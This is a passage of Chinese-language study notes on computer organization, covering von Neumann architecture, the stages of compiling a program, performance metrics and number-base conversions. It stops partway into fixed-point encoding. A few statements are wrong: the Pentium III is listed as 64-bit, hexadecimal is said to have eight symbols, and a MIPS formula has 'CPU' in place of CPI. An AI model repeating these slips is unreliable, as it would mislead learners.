<p>1971 年 Intel 公司产生的微处理器：Intel 4004、Intel 8008（8 位）、Intel 8086（16 位）、Intel 80386（32 位）、Pentium（32 位）、Pentium III（64 位）、Pentium 4（64 位）、Core i7（64 位）等。<strong>32 位和 64 位是指计算机进行一次整数运算所能处理的二进制数据的位数。</strong></p>
</li>
</ol>
</li>
</ul>
<h4> 软件的发展</h4>
<p>计算机语言的发展经历了面向机器的 <strong>机器语言</strong> 和 <strong>汇编语言</strong>、面向问题的 <strong>高级语言</strong>。其中高级语言的发展真正促进了软件的发展，它经历了从科学计算和工程计算的 FORTRAN、结构化程序设计的 PASCAL 到面向对象的 C++ 和适应网络环境的 Java。</p>
<p>与此同时，直接影响计算机系统性能提升的各种 <strong>系统软件</strong> 也有了长足的发展，特别是 <strong>操作系统</strong>。如：Windows、UNIX、Linux 等。</p>
<h3> 计算机系统层次结构</h3>
<h4> 系统的组成</h4>
<p><strong>硬件系统</strong> 和 <strong>软件系统</strong> 共同构成了一个完整的计算机系统。</p>
<ul>
<li><strong>硬件</strong>：是指有形的 <strong>物理设备</strong>，是计算机系统中实际物理装置的总称</li>
<li><strong>软件</strong>：是指在硬件上 <strong>运行的程序</strong> 和 <strong>相关的数据及文档</strong></li>
</ul>
<h4> 硬件</h4>
<ol>
<li>
<p><strong>冯·诺依曼基本思想</strong></p>
<p>冯·诺依曼在研究 EDVAC（Electronic Discrete Variable Automatic Computer）离散变量自动电子计算机时提出了 <strong>存储程序</strong> 的概念，存储程序的思想奠定了现代计算机的基本结构，以此概念为基础的各类计算机通称为 <strong>冯·诺依曼机</strong>，其特点如下：</p>
<ul>
<li>采用 <strong>存储程序</strong> 的工作方式</li>
<li>计算机硬件系统由 <strong>运算器</strong>、<strong>存储器</strong>、<strong>控制器</strong>、<strong>输入设备</strong> 和 <strong>输出设备</strong> 五大部件组成</li>
<li><strong>指令</strong> 和 <strong>数据</strong> 以同等地位存储在存储器中，形式上没有区别，但计算机应能区分它们</li>
<li>指令和数据均用二进制代码表示。指令由 <strong>操作码</strong> 和 <strong>地址码</strong> 组成，操作码指出操作的类型，地址码指出操作数的地址</li>
</ul>
<p><strong>存储程序</strong> 的基本思想：将事先编制好的程序和原始数据送入主存后才能执行，一旦程序被启动执行，就无须操作人员的干预，计算机会自动逐条执行指令，直至程序执行结束。</p>
</li>
<li>
<p><strong>计算机的功能部件</strong></p>
<ul>
<li>
<p><strong>输入设备</strong>：主要功能是将程序和数据 <strong>以机器所能识别的信息形式</strong> 输入计算机。最基本的输入设备是键盘，此外还有鼠标、扫描仪、摄像机等</p>
</li>
<li>
<p><strong>输出设备</strong>：主要功能是将计算机处理的结果 <strong>以人们所能接受的形式或其他系统所要求的信息形式</strong> 输出。最基本的输出设备是显示器、打印机等</p>
</li>
<li>
<p><strong>存储器</strong>：存储器分为 <strong>主存储器（内存储器）</strong> 和 <strong>辅助存储器（外存储器）</strong>。CPU 能够直接访问的存储器是主存储器，辅助存储器用于帮助主存储器记忆更多的信息，辅助存储器中的信息必须调入主存后，才能为 CPU 访问</p>
<p>主存储器的工作方式是按存储单元的地址进行存取，这种存取方式称为 <strong>按地址存取方式。</strong></p>
<figure><figcaption>主存储逻辑图</figcaption></figure>
<p>上图为主存储器基本组成。信息如下：</p>
<ul>
<li><strong>存储体</strong>：存放二进制信息</li>
<li><strong>地址寄存器（MAR）</strong>：存放访存地址，经过地址译码后找到所选的存储单元</li>
<li><strong>数据寄存器（MDR）</strong>：用于暂存要从存储器中读或写的信息</li>
<li><strong>时序控制逻辑</strong>：用于产生存储器操作所需的各种时序信号</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>MAR 和 MDR 虽然是存储器的一部分，但在现代计算机中却是存在于 CPU 中</p>
</div>
</li>
<li>
<p><strong>运算器</strong>：是计算机的执行部件，用于进行 <strong>算术运算</strong> 和 <strong>逻辑运算</strong>。算术运算是按算术运算规则进行的运算，如：加、减、乘、除；逻辑运算包括与、或、非、异或、比较、移位等运算</p>
</li>
<li>
<p><strong>控制器</strong>：是计算机的指挥中心，由其 <strong>指挥各部件自动协调</strong> 地进行工作。控制器由程序计数器（PC）、指令寄存器（IR）和控制单元（CU）组成</p>
<ul>
<li><strong>程序计数器（PC）</strong>：用来 <strong>存放当前要执行指令的地址</strong>，具体自动加 <code>1</code> 的功能（这里的 <code>1</code> 指一条指令的长度），即可自动形成下一条指令的地址，它与主存的 <code>MAR</code> 之间有一条直接通路</li>
<li><strong>指令寄存器（IR）</strong>：用来 <strong>存放当前的指令</strong>，其内容来自主存的 <code>MDR</code>。指令中的操作码OP(IR) 送至 <strong>控制单元（CU）</strong>，用以分析指令并发出各种微操作命令序列；而地址码Ad(IR) 送往 <code>MAR</code>，用以取操作数</li>
</ul>
</li>
</ul>
<p>输入/输出设备（简称 <code>I/O</code> 设备）是计算机与外界联系的桥梁，是计算机中不可缺少的重要组成部分。</p>
<p>一般将运算器和控制器集成到同一个芯片上，称为 <strong>中央处理器（CPU）</strong>。CPU 和主存储器共同构成主机，而除主机外的其他硬件装置（外存、<code>I/O</code> 设备等）统称为 <strong>外部设备</strong>，简称外设。</p>
<figure><figcaption>冯·诺依曼结构的模型机</figcaption></figure>
<p>上图所示为冯·诺依曼结构的模型机。CPU 包含：ALU、通用寄存器组 GPRs、标志寄存器、控制器、指令寄存器IR、程序计数器PC、存储器地址寄存器MAR 和存储器数据寄存器MDR。图中从控制器送出的虚线就是 <strong>控制信号</strong>，可以控制如何 <strong>修改程序计数器PC</strong> 以得到下一条指令的地址，可以控制 <strong>ALU</strong> 执行什么运算，可以控制 <strong>主存</strong> 是进行读操作还是写操作（读/写控制信号）。</p>
<p>CPU 和主存之间通过一组 <strong>总线</strong> 相连，总线中有 <strong>地址</strong>、<strong>控制</strong> 和 <strong>数据</strong> 三组信号线。<code>MAR</code> 中的 <strong>地址信息</strong> 会直接送到地址线上，用于指向读/写操作的主存存储单元；控制线中有 <strong>读/写信号线</strong>，指出数据是从 CPU 写入主存还是从主存读出到 CPU，根据是读操作还是写操作来控制将 <code>MDR</code> 中的 <strong>数据</strong> 是直接送到数据线上还是将数据线上的数据接收到 <code>MDR</code> 中。</p>
</li>
</ol>
<h4> 软件</h4>
<ol>
<li>
<p><strong>系统软件和应用软件</strong></p>
<p>软件按其功能分类，可分为 <strong>系统软件</strong> 和 <strong>应用软件。</strong></p>
<ul>
<li>
<p><strong>系统软件</strong>：是一组 <strong>保证计算机系统高效、正确运行的基础软</strong>件，通常作为系统资源提供给用户使用。主要有操作系统（OS）、数据库管理系统（DBMS）、语言处理程序、分布式软件系统、网络软件系统、标准库程序、服务性程序等</p>
</li>
<li>
<p><strong>应用软件</strong>：是指用户 <strong>为解决某个应用领域中的各类问题</strong> 而编制的程序。如：各种科学计算类程序、工程设计类程序、数据统计与处理程序等</p>
</li>
</ul>
</li>
<li>
<p><strong>三个级别的语言</strong></p>
<ul>
<li><strong>机器语言</strong>：又称 <strong>二进制代码语言</strong>，需要编程人员记忆每条指令的二进制编码。机器语言 <strong>是计算机唯一可以直接识别和执行的语言</strong></li>
<li><strong>汇编语言</strong>：汇编语言 <strong>用英文单词或其缩写代替二进制的指令代码</strong>，更容易为人们记忆和理解。使用汇编语言编辑的程序，必须经过一个称为汇编程序的系统软件的翻译，将其转换为机器语言程序后，才能在计算机的硬件系统上执行</li>
<li><strong>高级语言</strong>：如：C、C++、Java 等，是为 <strong>方便程序设计人员写出解决问题的处理方案和解题过程的程序</strong>。通常高级语言需要经过编译程序编译成汇编语言程序，然后经过汇编操作得到机器语言程序，或直接由高级语言程序翻译成机器语言程序</li>
</ul>
<p>由于计算机无法直接理解和执行高级语言程序，需要将高级语言程序转换为机器语言程序，通常把进行这种转换的软件系统称为翻译程序。<strong>翻译程序有以下三类：</strong></p>
<ul>
<li><strong>汇编程序（汇编器）</strong>：将汇编语言程序翻译成机器语言程序</li>
<li><strong>解释程序（解释器）</strong>：将源程序中的语句按执行顺序逐条翻译成机器指令并立即执行</li>
<li><strong>编译程序（编译器）</strong>：将高级语言程序翻译成汇编语言或机器语言程序</li>
</ul>
</li>
<li>
<p><strong>软件和硬件的逻辑功能等价性</strong></p>
<p>硬件实现的往往是最基本的算术和逻辑运算功能，而其他功能大多通过软件的扩充得以实现。对某一功能来说，既可以由硬件实现，又可以由软件实现，从用户的角度来看，它们在功能上是等价的。这一等价性被称为 <strong>软、硬件逻辑功能的等价性。</strong></p>
<p>例如：浮点数运算既可以用专门的浮点运算器硬件实现，又可以通过一段子程序实现，这两种方法在功能上完全等效，不同的只是执行时间的长短而已，显然硬件实现的性能要优于软件实现的性能。</p>
</li>
</ol>
<h4> 层次结构</h4>
<p>计算机是一个硬软件组成的综合体。由于面对的应用范围越来越广，必须有复杂的系统软件和硬件支持。</p>
<p>计算机系统的 <strong>多级层次结构的作用</strong>：根据使用者对计算机系统属性的要求不同，来分清彼此之间的界面，明确各自的功能，以便构成合理、高效的计算机系统。</p>
<figure><figcaption>层次结构</figcaption></figure>
<ul>
<li><strong>微程序机器M0（微指令系统）</strong>：是一个实在的硬件层，它由机器硬件直接执行微指令</li>
<li><strong>传统机器M1（机器语言机器）</strong>：是一个实在的硬件层，由微程序解释机器指令系统</li>
<li><strong>虚拟机器M2（操作系统机器）</strong>：由操作系统程序实现。操作系统程序是由 <strong>机器指令</strong> 和 <strong>广义指令</strong> 组成的，这些广义指令是为了扩展机器功能而设置的，是由操作系统定义和解释的软件指令</li>
<li><strong>虚拟机器M3（汇编语言机器）</strong>：为用户 <strong>提供一种符号化的语言</strong>，借此可编写汇编语言源程序。这一层由汇编程序支持和执行</li>
<li><strong>虚拟机器M4（高级语言机器）</strong>：是面向用户的，是为 <strong>方便用户编写应用程序</strong> 而设置的。该层由各种高级语言编译程序支持和执行</li>
<li><strong>虚拟机器M5（应用程序机器）</strong>：由 <strong>解决实际问题的处理程序</strong> 组成。如：文字处理软件、多媒体处理软件和办公自动软件等</li>
</ul>
<p><strong>M0-M1</strong> 没有配备软件的纯硬件系统称为裸机。<strong>M2-M5</strong> 称为虚拟机，简单来说就是软件实现的机器。每层只能通过该层的语言来了解和使用计算机，而不必关心下层是如何工作的。层次之间的关系紧密，下层是上层的基础，上层是下层的扩展。</p>
<p><strong>软件和硬件之间的交界面</strong>：就是指令集体系结构（ISA），ISA 定义了一台计算机可以执行的所有指令的集合，每条指令规定了计算机执行什么操作，以及所处理的操作数存放的地址空间和操作数类型。</p>
<h4> 工作原理</h4>
<ol>
<li>
<p><strong>存储程序工作方式</strong></p>
<figure><figcaption>程序执行过程</figcaption></figure>
<p>一个程序的执行就是周而复始地执行一条一条指令的过程。每条指令的执行过程包括：<strong>从主存取指令、对指令进行译码、计算下条指令地址、取操作数并执行、将结果送回存储器。</strong></p>
<p><strong>存储程序工作方式规定</strong>：程序执行前，先将程序第一条指令的地址存放到程序计数器（PC） 中，取指令时，将 PC 的内容作为地址访问主存。在每条指令执行过程中，都需要计算下条将执行指令的地址，并送至 PC。若当前指令为顺序型指令，则下条指令地址为 PC 的内容加上当前指令的长度；若当前指令为转跳型指令，则下条指令地址为指令中指定的目标地址。当前指令执行完后，根据 PC 的值到主存中取出的是下条将要执行的指令，因而计算机能周而复始地自动取出并执行一条一条的指令。</p>
</li>
<li>
<p><strong>从源程序到可执行文件</strong></p>
<p>在计算机中编写的 C 语言程序，都必须被转换为一系列的低级机器指令，这些指令按照一种称为可执行目标文件的格式打好包，并以二进制磁盘文件的形式存放起来。</p>
<figure><figcaption>源程序转换为可执行文件过程</figcaption></figure>
<p>以 UNIX 系统中的 GCC 编译器程序为例，读取源程序文件 <code>hello.c</code>，并把它翻译成一个可执行目标文件 <code>hello</code>，整个翻译过程可分为 <strong>四个阶段</strong> 完成：</p>
<ul>
<li><strong>预处理阶段</strong>：预处理器（cpp）对源程序中以字符 <code>#</code> 开头的命令进行处理。例如：将 <code>#include</code> 命令后面的 <code>.h</code> 文件内容插入程序文件。输出结果是一个以 <code>.i</code> 为扩展名的源文件 <code>hello.i</code></li>
<li><strong>编译阶段</strong>：编译器（ccl）对预处理后的源程序进行编译，生成一个汇编语言源程序 <code>hello.s</code>。汇编语言源程序中的每条语句都以一种文本格式描述了一条低级机器语言指令</li>
<li><strong>汇编阶段</strong>：汇编器（as）将 <code>hello.s</code> 翻译成机器语言指令，把这些指令打包成一个称为可重定位目标文件的<code> hello.o</code>，它是一种二进制文件，因此用文本编辑器打开会显示乱码</li>
<li><strong>链接阶段</strong>：链接器（ld）将多个可重定位目标文件和标准库函数合并为一个可执行目标文件，或简称可执行文件。本例中，链接器将 <code>hello.o</code> 和标准库函数 <code>printf</code> 所在的可重定位目标模块 <code>printf.o</code> 合并，生成可执行文件 <code>hello</code>。最终生成的可执行文件被保存在磁盘上</li>
</ul>
</li>
<li>
<p><strong>程序执行过程描述</strong></p>
<p>在图形化界面的操作系统中，可以采用双击图标的方式来执行程序。在 UNIX 系统中，可以通过 shell 命令行解释器来执行程序。通过 shell 命令行解释器执行程序的过程如下：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中，<strong>unix&gt;</strong> 是命令提示符，<strong>./</strong> 表示当前目录，<strong>hello</strong> 是可执行文件的路径名。输入命令后需按下 <kbd>Enter</kbd> 键才会执行，第二行是执行结果。</p>
<ul>
<li>shell 程序将用户从键盘输入的每个字符逐一读入 <strong>CPU 寄存器</strong>，然后保存到 <strong>主存储器中（主存）</strong></li>
<li>在主存的 <strong>缓冲区形成字符串</strong> <code>./hello</code></li>
<li>接收到 <kbd>Enter</kbd> 键时，shell 调出操作系统的内核程序，由 <strong>内核来加载磁盘</strong> 上的可执行文件 <code>hello</code> 到主存中</li>
<li>内核加载完可执行文件中的代码和数据（这里是字符串 <code>hello, world!\n</code>）后，将 <code>hello</code> 的第一条指令的地址送至 PC，CPU 随后开始执行 <code>hello</code> 程序，它将已加载到主存的字符串 <code>hello, world!\n</code> 中的每个字符 <strong>从主存中送到 CPU 的寄存器中</strong></li>
<li>然后将 CPU 寄存器中的字符 <strong>送到显示器</strong></li>
</ul>
</li>
<li>
<p><strong>指令执行过程描述</strong></p>
<p>可执行文件代码段是由一条一条机器指令构成的，指令是用 <code>0</code> 和 <code>1</code> 表示的一串 <code>0/1</code> 序列，用来指示 CPU 完成一个特定的原子操作。</p>
<p>以取数指令（送至运算器的 ACC 中）为例，<strong>其信息流程如下：</strong></p>
<ul>
<li>
<p><strong>取指令：PC→MAR→M→MDR→IR</strong></p>
<p>将 PC 的内容送 MAR，MAR 中的内容直接送地址线，同时控制器将读信号送读/写信号线，主存根据地址线上的地址和读信号，从指定存储单元读出指令，送到数据线上，MDR 从数据线接收指令信息，并传送到 IR 中。</p>
</li>
<li>
<p><strong>分析指令：OP(IR)→CU</strong></p>
<p>指令译码并送出控制信号。控制器根据 IR 中指令的操作码，生成相应的控制信号，送到不同的执行部件。在本例中，IR 中是取数指令，因此读控制信号被送到总线的控制线上。</p>
</li>
<li>
<p><strong>执行指令：Ad(IR)→MAR→M→MDR→ACC</strong></p>
<p>取数操作。将 IR 中指令的地址码送 MAR，MAR 中的内容送地址线，同时控制器将读信号送读/写信号线，从主存中读出操作数，并通过数据线送至 MDR，再传送到 ACC 中。</p>
<p>每取完一条指令，还须为取下条指令做准备，计算下条指令的地址，即 <code>(PC)+1→PC</code>。</p>
</li>
</ul>
</li>
</ol>
<h3> 性能指标</h3>
<h4> 主要性能指标</h4>
<ol>
<li>
<p><strong>字长</strong></p>
<p>计算机进行一次整数运算（即定点整数运算）所能 <strong>处理的二进制数据的位数</strong>，通常与 CPU 的寄存器位数、加法器有关。</p>
</li>
<li>
<p><strong>数据通路带宽</strong></p>
<p>外部数据总线一次所能 <strong>并行传送信息的位数。</strong></p>
</li>
<li>
<p><strong>主存容量</strong></p>
<p>主存储器所能 <strong>存储信息的最大容量</strong>，通常以字节来衡量，也可用 <strong>字数 x 字长</strong>（如：512K x 16位）来表示存储容量。其中 MAR 的位数代表存储单元的个数；MDR 的位数代表存储单元的字长。</p>
</li>
<li>
<p><strong>运算速度</strong></p>
<ul>
<li>
<p><strong>吞吐量和响应时间</strong></p>
<ul>
<li><strong>吞吐量</strong>：指系统在单位时间内处理请求的数量</li>
<li><strong>响应时间</strong>：指从用户向计算机发送一个请求到系统对该请求做出响应并获得所需结果的等待时间</li>
</ul>
</li>
<li>
<p><strong>主频和 CPU 时钟周期</strong></p>
<ul>
<li><strong>主频</strong>：CPU 时钟频率。机器内部主时钟的频率是衡量机器速度的重要参数。主频通常以 Hz（赫兹）为单位，1Hz 表示每秒一次</li>
<li><strong>CPU 时钟周期</strong>：通常为节拍脉冲或 T 周期，即主频的倒数，是 CPU 中最小的时间单位，执行指令的每个动作至少需要一个时钟周期</li>
</ul>
</li>
<li>
<p><strong>CPI（Cycle Per Instruction）</strong>：执行一条指令所需的时钟周期数</p>
</li>
<li>
<p><strong>CPU 执行时间</strong>：执行一个程序所花费的时间。CPU 执行时间 = CPU 时钟周期数/主频 = （指令条数 x CPI）/主频</p>
</li>
<li>
<p><strong>MIPS（Million Instructions Per Second）</strong>：每秒执行多少百万条指令。MIPS = 指令条数/（执行时间 x 10<sup>6</sup>）= 主频/（CPU x 10<sup>6</sup>）</p>
</li>
<li>
<p><strong>MFLOPS、GFLOPS、TFLOPS、PFLOPS、EFLOPS 和 ZFLOPS</strong></p>
<ul>
<li><strong>MFLOPS（Million Floating-point Operations Per Second）</strong>：每秒执行多少百万次浮点运算。MFLOPS = 浮点操作次数/（执行时间 x 10<sup>6</sup>）</li>
<li><strong>GFLOPS（Giga Floating-point Operations Per Second）</strong>：每秒执行多少十亿次浮点运算。GFLOPS = 浮点操作次数/（执行时间 x 10<sup>9</sup>）</li>
<li><strong>TFLOPS（Tera Floating-point Operations Per Second）</strong>：每秒执行多少万亿次浮点运算。TFLOPS = 浮点操作次数/（执行时间 x 10<sup>12</sup>）</li>
<li><strong>PFLOPS</strong> = 浮点操作次数/（执行时间 x 10<sup>15</sup>）</li>
<li><strong>EFLOPS</strong> = 浮点操作次数/（执行时间 x 10<sup>18</sup>）</li>
<li><strong>ZFLOPS</strong> = 浮点操作次数/（执行时间 x 10<sup>21</sup>）</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>基准程序</strong></p>
<p>用来 <strong>进行性能评价</strong> 的一组程序，能很好的反映机器在运行实际负载时的性能。</p>
</li>
</ol>
<h4> 专业术语</h4>
<ol>
<li>
<p><strong>系列机</strong></p>
<p>具有 <strong>基本相同的体系结构</strong>，使用相同基本指令系统的多个不同型号的计算机组成的一个产品系列。</p>
</li>
<li>
<p><strong>兼容</strong></p>
<p>指软件或硬件的通用性，即 <strong>运行在某个型号的计算机系统中的硬件/软件也能应用于另一个型号的计算机系统</strong> 时，称这两台计算机在硬件或软件上存在兼容性。</p>
</li>
<li>
<p><strong>软件可移植性</strong></p>
<p>指把使用在某个系列计算机中的软件直接或进行很少的修改就能运行在另一个系列计算机中的可能性。</p>
</li>
<li>
<p><strong>固件</strong></p>
<p>将 <strong>程序固化在 ROM 中组成的部件</strong> 称为固件。固件是一种具有软件特性的硬件，吸收了软/硬件各自的优点，其执行速度快于软件，灵活性优于硬件，是软/硬件结合的产物。例如：目前操作系统已实现了部分固化（把软件永恒地存储于 ROM 中）。</p>
</li>
</ol>
<h2> 数据的表示和运算</h2>
<h3> 数制与编码</h3>
<h4> 进位计数制及其相互转换</h4>
<p>在计算机系统内部，所有的信息都是用 <strong>二进制进行编码</strong> 的，这样做的原因有以下几点：</p>
<ul>
<li>二进制只有两种状态，使用有两个稳定状态的物理器件就可以表示二进制数的每一位，制造成本比较低，例如用高低电平或电荷的正负极性都可以很方便地表示 <code>0</code> 和 <code>1</code></li>
<li>二进制位 <code>1</code> 和 <code>0</code> 正好与逻辑值 “真” 和 “假” 对应，为计算机实现逻辑运算和程序中的逻辑判断提供了便利条件</li>
<li>二进制的编码和运算规则都简单，通过逻辑门电路能方便地实现算术运算</li>
</ul>
<ol>
<li>
<p><strong>进位计数法</strong></p>
<p>在进位计数法中，每个数位所用到的不同数码的个数称为 <strong>基数。</strong></p>
<p>每个数码所表示的数值等于该数码本身乘以一个与它所在数位有关的常数，这个常数称为 <strong>位权</strong>。位权最低位为 <code>0</code>。</p>
<ul>
<li><strong>二进制</strong>：基数为 <code>2</code>。只有 <code>0</code> 和 <code>1</code> 两种数字符号，计数 <strong>逢二进一</strong></li>
<li><strong>八进制</strong>：基数为 <code>8</code>。有 <code>0~7</code> 共八个不同的数字符号，计数 <strong>逢八进一</strong></li>
<li><strong>十进制</strong>：基数为 <code>10</code>。有 <code>0~9</code> 共十个不同的数字符号，计数 <strong>逢十进一</strong></li>
<li><strong>十六进制</strong>：基数为 <code>16</code>。有 <code>0~9、A、B、C、D、E、F</code> 共八个不同的数字符号，计数 <strong>逢十六进一</strong>。<code>A、B、C、D、E、F</code> 分别表示 <code>10~15</code></li>
</ul>
</li>
<li>
<p><strong>不同进制数之间相互转换</strong></p>
<ul>
<li>
<p><strong>二进制转八进制和十六进制</strong></p>
<p>二进制混合数（整数部分，小数部分），在转换时应以小数点为界。<strong>整数部分</strong>，从小数点开始往左数，将二进制数分为 <code>3</code> 位（八进制）或 <code>4</code> 位（十六进制）一组，最左边根据需要加 <code>0</code> 补齐；<strong>小数部分</strong>，从小数点开始往右数，将二进制数分为 <code>3</code> 位（八进制）或 <code>4</code> 位（十六进制）一组，最右边根据需要加 <code>0</code> 补齐。最终使总的位数为 <code>3</code> 或 <code>4</code> 的整数倍，分别用对应的八进制或十六进制取代。</p>
<p>例如：二进制数 <code>1111000010.01101</code> 分别转换为八进制和十六进制。</p>
<p>八进制：(1111000010.01101)<sub>2</sub> = (1702.32)<sub>8</sub></p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container info">
<p class="hint-container-title">每组二进制到八进制转换过程</p>
<ul>
<li>001 = 0x2<sup>2</sup> + 0x2<sup>1</sup> + 1x2<sup>0</sup> = 0 + 0 + 1 = 1</li>
<li>111 = 1x2<sup>2</sup> + 1x2<sup>1</sup> + 1x2<sup>0</sup> = 4 + 2 + 1 = 7</li>
<li>000 = 0x2<sup>2</sup> + 0x2<sup>1</sup> + 0x2<sup>0</sup> = 0 + 0 + 0 = 0</li>
<li>010 = 0x2<sup>2</sup> + 1x2<sup>1</sup> + 0x2<sup>0</sup> = 0 + 2 + 0 = 2</li>
<li>011 = 0x2<sup>2</sup> + 1x2<sup>1</sup> + 1x2<sup>0</sup> = 0 + 2 + 1 = 3</li>
<li>010 = 0x2<sup>2</sup> + 1x2<sup>1</sup> + 0x2<sup>0</sup> = 0 + 2 + 0 = 2</li>
</ul>
</div>
<p>十六进制：(1111000010.01101)<sub>2</sub> = (3C2.68)<sub>16</sub></p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container info">
<p class="hint-container-title">每组二进制到十六进制转换过程</p>
<ul>
<li>0011 = 0x2<sup>3</sup> + 0x2<sup>2</sup> + 1x2<sup>1</sup> + 1x2<sup>0</sup> = 0 + 0 + 2 + 1 = 3</li>
<li>1100 = 1x2<sup>3</sup> + 1x2<sup>2</sup> + 0x2<sup>1</sup> + 0x2<sup>0</sup> = 8 + 4 + 0 + 0 = 12 = C</li>
<li>0010 = 0x2<sup>3</sup> + 0x2<sup>2</sup> + 1x2<sup>1</sup> + 0x2<sup>0</sup> = 0 + 0 + 2 + 0 = 2</li>
<li>0110 = 0x2<sup>3</sup> + 1x2<sup>2</sup> + 1x2<sup>1</sup> + 0x2<sup>0</sup> = 0 + 4 + 2 + 0 = 6</li>
<li>1000 = 1x2<sup>3</sup> + 0x2<sup>2</sup> + 0x2<sup>1</sup> + 0x2<sup>0</sup> = 8 + 0 + 0 + 0 = 8</li>
</ul>
</div>
</li>
<li>
<p><strong>八进制和十六进制转二进制</strong></p>
<p>只需将每位改为 <code>3</code> 位或 <code>4</code> 位二进制数即可（必要时去掉整数最高位或小数最低位的 <code>0</code>）。</p>
</li>
<li>
<p><strong>八进制和十六进制之间转换</strong></p>
<p>八进制转十六进制（或十六进制转八进制）时，先将八进制（或十六进制）数转换为二进制，然后由二进制再转换为十六进制（或八进制）数。</p>
</li>
<li>
<p><strong>任意进制转十进制</strong></p>
<p>将任意进制数的各位数码与它们的权值相乘，再把乘积相加，结果就是十进制数。这种方法称为 <strong>按权展开相加法。</strong></p>
<p>例如：二进制数 <code>11011.1</code> 转换为十进制。</p>
<p>(11011.1)<sub>2</sub> = 1x2<sup>4</sup> + 1x2<sup>3</sup> + 0x2<sup>2</sup> + 1x2<sup>1</sup> + 1x2<sup>0</sup> + 1x2<sup>-1</sup> = 27.5</p>
</li>
<li>
<p><strong>十进制转任意进制</strong></p>
<p>十进制转任意进制，常采用 <strong>基数乘除法</strong>。这种转换方法对十进制整数部分用 <strong>除基取余法</strong>；对小数部分用 <strong>乘基取整法</strong>，最后将整数部分和小数部分的转换结果拼接起来。</p>
<ul>
<li><strong>除基取余法</strong>：整数部分除基取余，最先取得的余数为数的最低位，最后取得的余数为数的最高位（即除基取余，先余为低，后余为高），商为 <code>0</code> 时结束</li>
<li><strong>乘基取整法</strong>：小数部分乘基取整，最先取得的整数为数的最高位，最后取得的整数为数的最低位（即乘基取整，先整为高，后整为低），乘积为 <code>1.0</code>（或满足精度要求）时结束</li>
</ul>
<p>例如：十进制数 <code>123.6875</code> 转换成二进制。</p>
<p>整数部分：123 = (1111011)<sub>2</sub></p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>小数部分：0.6875 = (0.1011)<sub>2</sub></p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因此十进制数 123.6875 转换成二进制数为 (1111011.1011)<sub>2</sub></p>
</li>
</ul>
<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>在计算机中，小数和整数不一样，整数可以连续表示，但小数是离散的，所以并不是每个十进制小数都可以准确地用二进制表示。例如：<code>0.3</code>，无论经过多少次乘二取整转换都无法得到精确的结果。但任意一个二进制小数都可以用十进制小数表示</p>
</div>
</li>
<li>
<p><strong>真值和机器数</strong></p>
<p>在日常生活中，通常用正号、负号来分别表示正数（正号可省略）和负数，如：<code>+15</code>、<code>-8</code> 等。这种带 <code>+</code> 或 <code>-</code> 符号的数称为 <strong>真值</strong>。真值是机器数所代表的实际值。</p>
<p>在计算机中，通常将数的符号和数值部分一起编码，将数据的符号数字化，通常用 <code>0</code> 表示 <strong>正</strong>，用 <code>1</code> 表示 <strong>负</strong>。这种把符号（+/-）“数字化” 的数称为 <strong>机器数</strong>。常用的有原码、补码、反码和移码表示法。如：<code>0,101</code>（这里的逗号 <code>,</code> 仅为区分符号位与数值位）表示 <code>+5</code>。</p>
</li>
</ol>
<h4> BCD 码</h4>
<p><strong>二进制编码的十进制数（Binary-Coded Decimal，BCD）</strong> 通常采用 <code>4</code> 位二进制数来表示一位十进制数中的 <code>0~9</code> 这 <code>10</code> 个数码。这种编码方法使二进制数和十进制数之间的转换得以快速进行。但 <code>4</code> 位二进制数可以组合出 <code>16</code> 种代码，因此必有 <code>6</code> 种状态为余状态。</p>
<p><strong>常用的 BCD 码：</strong> 8421 码、余 3 码、2421 码。</p>
<h4> 定点数的编码表示</h4>
<p>根据小数点的位置是否固定，在计算机中有两种数据格式：<strong>定点表示</strong> 和 <strong>浮点表示</strong>。在现代计算机中，通常用定点补码整数表示整数，用定点原码小数表示浮点数的尾数部分，用移码表示浮点数的阶码部分。</p>
<ol>
<li>
<p><strong>机器数的定点表示</strong></p>
<p>定点表示法用来表示 <strong>定点小数</strong> 和 <strong>定点整数。</strong></p>
<ul>
<li>
<p><strong>定点小数</strong>：是纯小数</p>
<figure><figcaption>定点小数</figcaption></figure>
<p>约定小数点位置在符号位之后、有效数值部分最高位之前。例如：<strong>x<sub>0</sub>.x<sub>1</sub>x<sub>2</sub>……x<sub>n</sub></strong>。其中 <strong>x<sub>0</sub></strong> 为符号位，<strong>x<sub>1</sub>~x<sub>n</sub></strong> 为数值的有效部分也称为 <strong>数尾</strong>，<strong>x<sub>1</sub></strong> 为最高有效位。</p>
</li>
<li>
<p><strong>定点整数</strong>：是纯整数</p>
<figure><figcaption>定点整数</figcaption></figure>
<p>约定小数点位置在有效数值部分最低位之后。例如：<strong>x<sub>0</sub>x<sub>1</sub>x<sub>2</sub>……x<sub>n</sub>.</strong>。其中 <strong>x<sub>0</sub></strong> 为符号位，<strong>x<sub>1</sub>~x<sub>n</sub></strong> 为 <strong>数尾</strong>，<strong>x<sub>n</sub></strong> 为最低有效位。</p>
</li>
</ul>
<p>定点数编码表示法主要有四种：原码、补码、反码和移码。</p>
</li>
<li>
<p><strong>定点表示法</strong></p>
